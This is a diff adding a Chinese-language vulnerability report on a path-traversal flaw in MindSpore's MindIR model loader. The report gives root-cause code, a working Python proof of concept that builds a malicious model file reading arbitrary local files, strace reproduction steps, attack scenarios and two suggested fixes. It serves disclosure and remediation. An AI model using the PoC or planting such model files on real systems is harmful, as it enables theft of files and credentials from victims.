@@ -1,0 +1,317 @@
+================================================================================
+                    MindSpore 安全漏洞报告
+================================================================================
+
+报告编号: MS-2025-001
+标题: MindIR External Data 路径穿越导致任意文件读取
+报告日期: 2026-05-19
+报告人: [你的名字/ID]
+
+================================================================================
+一、基本信息
+================================================================================
+
+项目名称:       MindSpore
+项目地址:       https://gitee.com/mindspore/mindspore
+                https://github.com/mindspore-ai/mindspore
+影响版本:       2.8.0 (Gitee master branch, 截至 2026-05-19)
+运行平台:       x86_64 / arm64 (Linux)
+严重性:         Critical
+CVSS 3.1 评分:  8.6 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)
+CWE 分类:       CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
+攻击向量:       本地 / 需要用户加载恶意模型文件
+影响组件:       mindspore/core/load_mindir/load_model.cc
+                函数: MSANFModelParser::GetTensorDataFromExternal()
+
+================================================================================
+二、漏洞概述
+================================================================================
+
+MindSpore 在加载 MindIR (.mindir) 模型文件时，如果模型使用了外部数据存储
+(external_data)，其 location 字段会被直接拼接到文件路径中用于读取张量数据。
+该字段来自 protobuf 反序列化，完全由模型文件控制，没有任何路径校验或规范化。
+
+攻击者可以构造恶意 MindIR 文件，将 external_data.location 设置为包含 "../"
+的路径（如 "../../../../etc/passwd"），当受害者加载该模型时，框架会尝试打开
+并读取系统上的任意文件。
+
+已知同类漏洞先例:
+- CVE-2024-27318: ONNX external_data path traversal (CVSS 5.5)
+- CVE-2025-51480: ONNX external_data.location path traversal (再次出现)
+MindSpore 存在完全相同的缺陷但尚未修复。
+
+================================================================================
+三、影响分析
+================================================================================
+
+1. 信息泄露: 读取系统敏感文件 (/etc/shadow、SSH keys、环境变量、数据库凭证)
+2. 模型投毒链: 在模型分享/下载场景中 (ModelZoo、HuggingFace Hub)，攻击者
+   上传恶意模型文件，受害者加载后泄露本机敏感数据
+3. 云环境凭证窃取: 在 AI 训练平台上，可能读取其他用户的文件或云凭证
+
+攻击入口: mindspore.load("malicious.mindir") -- 这是 MindSpore 用户加载模型
+的标准方式。
+
+================================================================================
+四、技术细节
+================================================================================
+
+4.1 攻击者可控的输入来源
+--------------------------------------------------------------------------------
+
+文件: mindspore/core/proto/mind_ir.proto
+
+    message ExternalDataProto {
+        // POSIX filesystem path relative to the directory where the
+        // MindIR model was stored.
+        optional string location = 1;   // <-- 攻击者完全控制
+        optional int64 offset = 2;      // <-- 攻击者完全控制
+        optional int64 length = 3;      // <-- 攻击者完全控制
+    }
+
+4.2 漏洞根因: 路径直接拼接，无校验
+--------------------------------------------------------------------------------
+
+文件: mindspore/core/load_mindir/load_model.cc
+函数: MSANFModelParser::GetTensorDataFromExternal()
+
+关键代码:
+
+    bool MSANFModelParser::GetTensorDataFromExternal(
+        const mind_ir::TensorProto &tensor_proto,
+        const tensor::TensorPtr &tensor_info) {
+      // ...
+      } else {
+        // [漏洞点] location 来自 protobuf，直接拼接到路径
+        std::string file = mindir_path_ + "/" +
+                           tensor_proto.external_data().location();
+        // ...
+      }
+
+mindir_path_ 的来源 (同一文件):
+
+    auto mindir_path = std::string(abs_path_buff);
+    model_parser.SetMindIRPath(mindir_path.substr(0, mindir_path.rfind("/")));
+    // 例如: /home/user/models/
+
+攻击路径:
+    mindir_path_  = "/home/victim/models"
+    location      = "../../../../etc/passwd"
+    拼接结果      = "/home/victim/models/../../../../etc/passwd"
+    操作系统解析  = /etc/passwd
+
+4.3 文件被完整读入内存
+--------------------------------------------------------------------------------
+
+    } else if (weight_buffer_.first == nullptr) {
+      // Read file
+      std::basic_ifstream<char> fid(file, std::ios::in | std::ios::binary);
+      if (!fid) {
+        MS_LOG(EXCEPTION) << "Open file '" << file << "' failed, ...";
+      }
+      (void)fid.seekg(0, std::ios_base::end);
+      size_t file_size = static_cast<size_t>(fid.tellg());
+      fid.clear();
+      (void)fid.seekg(0);
+      std::unique_ptr<char[]> plain_data(new (std::nothrow) char[file_size]);
+      // ...
+      (void)fid.read(plain_data.get(), SizeToLong(file_size));
+      // ^^^ 目标文件全部内容被完整读入堆内存
+
+4.4 缓解因素说明: 字节序检查
+--------------------------------------------------------------------------------
+
+文件读入后存在一个字节序检查:
+
+    constexpr Byte is_little_endian = 1;
+    constexpr int byte_order_index = 0;
+    if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
+        MS_LOG(ERROR) << "The byte order of export MindIr device and "
+                         "load MindIr device is not same!";
+        return false;
+    }
+
+分析:
+- 在 x86_64 (小端) 系统上: 如果目标文件第一字节不等于 0x01，函数 return false
+- 但此时文件已被完整读入堆内存 (fid.read 已执行)，openat 系统调用已完成
+- 对于第一字节恰好为 0x01 的文件 (如某些二进制数据文件)，数据会通过字节序
+  检查并被完整加载到 tensor 中
+- strace 可捕获到 openat 调用，证明路径穿越确实发生
+
+4.5 关键缺失
+--------------------------------------------------------------------------------
+
+- 无 "../" 过滤
+- 无 realpath() 规范化后的目录前缀校验
+- 无文件路径白名单
+- 无符号链接检查
+- 无 location 字段的字符集限制
+
+================================================================================
+五、PoC (概念验证代码)
+================================================================================
+
+#!/usr/bin/env python3
+"""
+MS-2025-001 PoC: MindIR External Data 路径穿越
+构造恶意 MindIR 文件，利用 external_data.location 读取任意文件
+"""
+import os
+import sys
+
+def create_malicious_mindir(target_file="/etc/hostname", output_dir="./poc_model"):
+    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto
+
+    os.makedirs(output_dir, exist_ok=True)
+
+    model = ModelProto()
+    model.ir_version = 6
+    model.producer_name = "MindSpore"
+    model.model_version = 1
+    model.little_endian = True
+
+    graph = model.graph
+    graph.name = "poc_graph"
+
+    param = graph.parameter.add()
+    param.name = "Default/param0:param0"
+    param.data_type = TensorProto.FLOAT
+    param.dims.extend([1024])
+
+    # 计算从 output_dir 到 target_file 的相对路径穿越
+    abs_output = os.path.abspath(output_dir)
+    abs_target = os.path.abspath(target_file)
+    relative_path = os.path.relpath(abs_target, abs_output)
+
+    # 设置 external_data: location 为路径穿越 payload
+    param.external_data.location = relative_path
+    param.external_data.offset = 0
+    param.external_data.length = 0
+
+    mindir_path = os.path.join(output_dir, "malicious.mindir")
+    with open(mindir_path, "wb") as f:
+        f.write(model.SerializeToString())
+
+    print(f"[+] 恶意模型已创建: {mindir_path}")
+    print(f"[+] 目标文件: {target_file}")
+    print(f"[+] 穿越路径: {relative_path}")
+    return mindir_path
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
+    create_malicious_mindir(target)
+
+================================================================================
+六、复现步骤
+================================================================================
+
+环境要求:
+- 操作系统: Linux x86_64
+- MindSpore 版本: 2.8.0
+- Python 版本: 3.8+
+
+步骤 1: 安装 MindSpore
+
+    pip install mindspore==2.8.0
+
+步骤 2: 生成恶意模型
+
+    python3 poc_path_traversal.py /etc/hostname
+
+步骤 3: 用 strace 验证路径穿越
+
+    strace -e trace=openat python3 -c "
+    import mindspore
+    try:
+        mindspore.load('./poc_model/malicious.mindir')
+    except:
+        pass
+    " 2>&1 | grep hostname
+
+预期输出 (证明路径穿越发生):
+
+    openat(AT_FDCWD, "./poc_model/../../../../etc/hostname", O_RDONLY) = 3
+
+验证要点:
+- strace 输出中观察到 openat 成功打开穿越后的路径即证明漏洞存在
+- 即使后续字节序检查失败，文件已被完整读入进程内存
+
+================================================================================
+七、利用场景
+================================================================================
+
+场景 1: 模型分享平台
+    攻击者上传恶意模型到 ModelZoo / HuggingFace
+    受害者下载后执行 ms.load() 触发
+
+场景 2: 企业 AI 平台
+    用户上传自定义模型进行推理
+    平台加载模型时触发
+
+场景 3: 邮件钓鱼
+    "请帮忙测试这个模型权重文件"
+
+场景 4: 供应链投毒
+    在公开模型仓库放置带路径穿越的模型文件
+
+================================================================================
+八、修复建议
+================================================================================
+
+方案 A (推荐): 路径规范化 + 目录前缀校验
+
+    std::string file = mindir_path_ + "/" +
+                       tensor_proto.external_data().location();
+
+    // 修复: 规范化路径并校验是否在 mindir_path_ 目录下
+    char resolved_path[PATH_MAX];
+    if (realpath(file.c_str(), resolved_path) == nullptr) {
+      MS_LOG(ERROR) << "Failed to resolve external data path: " << file;
+      return false;
+    }
+
+    char resolved_base[PATH_MAX];
+    if (realpath(mindir_path_.c_str(), resolved_base) == nullptr) {
+      MS_LOG(ERROR) << "Failed to resolve base path: " << mindir_path_;
+      return false;
+    }
+
+    std::string resolved_file_str(resolved_path);
+    std::string resolved_base_str(resolved_base);
+    resolved_base_str += "/";
+
+    if (resolved_file_str.rfind(resolved_base_str, 0) != 0) {
+      MS_LOG(ERROR) << "Path traversal detected! External data location "
+                    << "resolves outside the model directory.";
+      return false;
+    }
+
+方案 B (最小修改): 拒绝危险路径组件
+
+    const auto &location = tensor_proto.external_data().location();
+    if (location.find("..") != std::string::npos ||
+        location.find('/') == 0 ||
+        location.find('\\') != std::string::npos) {
+      MS_LOG(ERROR) << "Invalid external data location: " << location;
+      return false;
+    }
+
+================================================================================
+九、参考资料
+================================================================================
+
+[1] CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+    https://cwe.mitre.org/data/definitions/22.html
+
+[2] CVE-2024-27318: ONNX Path Traversal via external_data (完全相同攻击模式)
+    https://nvd.nist.gov/vuln/detail/CVE-2024-27318
+
+[3] CVE-2025-51480: ONNX external_data.location path traversal
+    https://nvd.nist.gov/vuln/detail/CVE-2025-51480
+
+[4] MindSpore Security Policy
+    https://gitee.com/mindspore/community/blob/master/security/README.md
+
+================================================================================
+                              报告结束
+================================================================================
